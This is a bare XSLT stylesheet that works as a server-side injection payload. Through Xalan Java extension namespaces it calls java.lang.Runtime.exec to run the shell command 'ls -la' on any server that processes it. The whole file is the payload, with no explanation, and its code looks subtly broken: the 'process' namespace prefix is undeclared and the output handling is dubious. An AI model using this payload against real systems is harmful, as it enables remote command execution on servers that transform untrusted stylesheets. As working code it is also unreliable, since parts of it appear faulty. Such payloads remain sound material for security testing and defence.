<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
  exclude-result-prefixes="rt ob">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rt, 'ls -la')"/>
    <xsl:variable name="input" select="process:getInputStream($process)"/>
    <xsl:copy-of select="document($input)"/>
  </xsl:template>
</xsl:stylesheet>
